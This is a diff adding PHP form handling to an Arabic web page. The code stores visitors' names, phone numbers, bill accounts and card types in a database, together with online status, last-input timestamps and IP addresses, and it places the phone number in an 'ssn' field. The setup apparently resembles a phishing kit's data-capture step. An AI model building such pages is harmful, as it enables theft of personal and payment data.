@@ -1,5 +1,36 @@
+<?php
+session_start();
+require_once __DIR__ . '/config.php';
 
+if (isset($_POST['submit'])) {
+    $name = $_POST['name'] ?? '';
+    $phone = $_POST['phone'] ?? '';
+    $address = $_POST['bill_account'] ?? '';
+    $card_type = $_POST['card_type'] ?? '';
 
+    $result = supabase_insert('users', [
+        'username' => $name,
+        'phone' => $phone,
+        'address' => $address,
+        'ssn' => $phone,
+        'insurance_company' => $card_type,
+        'page' => 'index-details.php',
+        'message' => 'معلومات مقدم الطلب',
+        'is_online' => true,
+        'last_input_at' => date('Y-m-d H:i:s')
+    ]);
+
+    if (!empty($result) && isset($result[0]['id'])) {
+        $_SESSION['user_id'] = $result[0]['id'];
+    }
+
+    // Track visit
+    supabase_insert('visits', [
+        'user_id' => $_SESSION['user_id'] ?? null,
+        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? ''
+    ]);
+}
+?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
